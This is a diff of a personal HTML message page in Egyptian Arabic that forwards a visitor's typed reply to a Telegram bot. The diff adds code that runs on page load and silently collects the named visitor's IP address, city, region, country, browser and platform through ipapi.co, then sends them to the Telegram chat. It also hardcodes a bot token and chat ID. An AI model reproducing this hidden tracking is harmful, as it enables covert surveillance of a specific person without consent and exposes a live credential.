@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>rvttojty forever</title>
+    <title>rrvttojty forever💟 ،</title>
     <style>
         body {
             background-color: #ffe6f0;
@@ -78,19 +78,14 @@
 <body>
 
     <div class="container" id="messageContainer">
-        <!-- مكان عرض الرسالة -->
-        <div class="message" id="displayMessage">اكتبي هبي بقا عقبال ما اكتبلك يبت يمو شخه انتي</div>
+        <div class="message" id="displayMessage">اكتبي هبي يمو شخه ع مكسل دلوقتي😔</div>
         
-        <!-- مربع إدخال الرسالة بشكل نصي يتوسع تلقائياً -->
         <textarea class="input-field" id="userMessage" placeholder="Write your reply..." rows="1" oninput="autoGrow(this)"></textarea>
-
-        <!-- زر إرسال الرسالة -->
         <button class="button" onclick="sendMessage()">Send a Reply</button>
     </div>
 
     <script>
         function autoGrow(element) {
-            // إعادة تعيين الارتفاع للسماح للنص بتغيير الحجم بشكل ديناميكي
             element.style.height = "auto";
             element.style.height = (element.scrollHeight) + "px";
         }
@@ -104,28 +99,23 @@
                 // إرسال الرسالة إلى تليجرام
                 sendToTelegram(userMessage);
 
-                // تفريغ الخانة بعد الإرسال
                 document.getElementById('userMessage').value = "";
-                document.getElementById('userMessage').style.height = "auto";  // إعادة تعيين الارتفاع
+                document.getElementById('userMessage').style.height = "auto"; 
             } else {
-                alert("Please enter a message.");
+                alert("😭ابوس طيزك اكتبي مسدج الاول.");
             }
         }
 
         function sendToTelegram(message) {
-            // هنا قم بإضافة توكن البوت الخاص بك ومعرف الشات
             const botToken = '7525866619:AAFvucD9MBOr7z4XFUbRSYlYMXFsdDut800';
             const chatId = '7631254472';
-
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            // إنشاء البيانات المطلوب إرسالها
             const data = {
                 chat_id: chatId,
                 text: message
             };
 
-            // إرسال الطلب باستخدام Fetch API
             fetch(url, {
                 method: 'POST',
                 headers: {
@@ -134,15 +124,34 @@
                 body: JSON.stringify(data)
             })
             .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                } else {
-                }
-            })
             .catch(error => {
                 console.error("Error sending message:", error);
             });
         }
+
+        function sendVisitorDetails() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const city = data.city;
+                    const region = data.region;
+                    const country = data.country_name;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+
+                    const message = `ريتاج شافت الهبي😱!\n\n- IP: ${ip}\n- المدينة: ${city}\n- المنطقة: ${region}\n- الدولة: ${country}\n- المتصفح: ${userAgent}\n- النظام: ${platform}`;
+
+                    sendToTelegram(message);
+                })
+                .catch(error => {
+                    console.error("Error fetching visitor details:", error);
+                });
+        }
+        
+        window.onload = function() {
+            sendVisitorDetails();
+        };
     </script>
 
 </body>
